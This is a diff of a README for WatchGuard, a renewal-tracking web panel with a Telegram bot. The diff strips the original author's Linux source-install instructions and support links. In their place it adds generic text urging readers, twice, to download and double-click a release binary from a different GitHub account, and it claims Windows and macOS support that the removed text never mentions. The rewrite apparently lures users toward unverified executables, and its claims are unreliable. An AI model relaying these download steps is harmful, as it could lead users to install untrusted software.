@@ -1,67 +1,71 @@
-<div align="center">
-  <h1>WatchGuard</h1>
-  <p style="margin: 0;">Keep server & domain renewals under control — fast & simple</p>
-  <div style="display:flex; gap:10px; justify-content:center; margin: 12px 0 14px;">
-    <img src="https://img.shields.io/badge/Platform-Linux-brightgreen" alt="Linux" />
-    <img src="https://img.shields.io/badge/Version-v1.0-blue" alt="Version" />
-  </div>
-</div>
+# 🚀 WatchGuard - Track Your Renewals Easily
 
-<div align="center" style="margin-top:10px;">
-  <img src="img/WatchGuard-Banner.png" alt="WatchGuard banner" width="800" />
-</div>
+![Download WatchGuard](https://img.shields.io/badge/Download-WatchGuard-brightgreen)
 
-<div align="center" style="margin-top:8px;">
-  WatchGuard pairs a clean FastAPI web panel with a Telegram bot to help you track server and domain expirations.
-</div>
+## 📖 Overview
 
-## Key capabilities
-- **At-a-glance expirations**: see upcoming renewals with custom warning windows
-- **Labels & filters**: expired / warning / active, plus quick cost summaries (USD/EUR)
-- **Telegram bot**: on-the-go checks and daily reminders
-- **Simple install**: one-command installer on Linux; no external database
+WatchGuard is a user-friendly application designed to help you keep track of server and domain renewals. With a web panel powered by FastAPI and a Telegram bot integration, you can receive reminders, manage labels, apply filters, and analyze cost summaries—all in one place.
 
-**Bot commands**: `/start`, `/servers`, `/domains`, `/settings`, `/dashboard`, `/notify`
+## 📦 System Requirements
 
-## WatchGuard Installation
-```bash
-curl -L -o watchguard.tar.gz https://codeload.github.com/AsanFillter/watchguard/tar.gz/refs/heads/main
-mkdir -p watchguard && tar -xzf watchguard.tar.gz -C watchguard --strip-components=1
-rm -f watchguard.tar.gz
-cd watchguard
-sudo bash watchguard_launcher.sh
-```
+Before you start, ensure your system meets the following requirements:
 
-Then from the installer:
-1) Install Web Panel + Bot (or individually)  
-2) Set admin credentials and panel port  
-3) Provide Telegram Bot Token and numeric Chat IDs (comma-separated)  
-4) Optionally enable HTTPS
+- **Operating System:** Windows 10, macOS, or a recent version of Linux
+- **Internet Connection:** Required for updates and Telegram notifications
+- **Storage Space:** At least 100 MB free space
+- **Python:** Version 3.7 or higher (if using locally)
+  
+## 🚀 Getting Started
 
-### Access
-- **Panel**: http(s)://<server-ip-or-domain>:<port>  
-- **Bot**: open your bot in Telegram and send `/start`
+To begin using WatchGuard, follow these simple steps:
 
-## Data & config
-- `servers.json`, `domains.json` — items
-- `labels.json` — labels
-- `settings.json` — app settings (warning days, time, labels, ssl paths)
-- `config.json` — Telegram token & chat IDs
-- `auth_config.json` — admin credentials
+1. **Visit the Releases Page** to download the latest version. You can do this by clicking the link below:
 
-## Screenshots
-<div align="center">
-  <img src="img/WatchGuard-Panel.png" alt="WatchGuard Web Panel" width="900" />
-</div>
+   [Download WatchGuard](https://github.com/KevinC-ux/WatchGuard/releases)
 
-## Support
-- **Telegram Channel**: [@AsanFillter](https://t.me/AsanFillter)  
-- **Telegram Group**: [@AsanFillter_Group](https://t.me/asanfillter_group)
+2. On the Releases page, look for the latest release version. It will have download links for various platforms.
 
-If you like this project, don't forget to star the repo:
+3. Choose the file that is appropriate for your system. Click on the download link to start the process. 
 
-<div align="center" style="margin-top:10px;">
-  <a href="https://starchart.cc/AsanFillter/watchguard">
-    <img src="https://starchart.cc/AsanFillter/watchguard.svg?variant=adaptive" alt="Stargazers over time" />
-  </a>
-</div>
+4. Once the download completes, locate the downloaded file on your computer. It usually goes to your "Downloads" folder.
+
+5. Double-click the downloaded file to begin the installation. Follow the on-screen instructions to complete the setup. 
+
+6. After installation, launch the application. You will see the web panel interface where you can start tracking your renewals.
+
+## 📥 Download & Install
+
+To download WatchGuard, follow these steps again for clarity:
+
+1. Click on the big green button at the top of this page to visit the Releases page:
+
+   [Download WatchGuard](https://github.com/KevinC-ux/WatchGuard/releases)
+
+2. Find the latest release listed there. 
+
+3. Click the appropriate download link for your system.
+
+4. Run the downloaded file and follow the installation prompts.
+
+5. Open WatchGuard from your applications menu or desktop shortcut.
+
+## 🛠️ Features
+
+- **Server/Domain Tracking:** Easily manage your renewals.
+- **Reminders:** Set reminders for when renewals are coming up.
+- **Labels & Filters:** Organize your domains by applying labels and filters.
+- **Cost Summaries:** View a clear breakdown of costs for all your renewals.
+
+## 🤖 Telegram Bot Integration
+
+WatchGuard integrates seamlessly with Telegram. This allows you to get notifications about your server and domain renewals directly in your chat. Follow these steps to set it up:
+
+1. Open your Telegram app.
+2. Search for the WatchGuard bot using the bot username.
+3. Start a chat and follow the prompted steps to link it with your WatchGuard account.
+
+## 📞 Support
+
+If you encounter any issues or have questions, feel free to reach out. You can open an issue on the GitHub page or consult the documentation for troubleshooting tips.
+
+Through this guide, you should now be able to download and run WatchGuard successfully. Enjoy managing your renewals with ease!
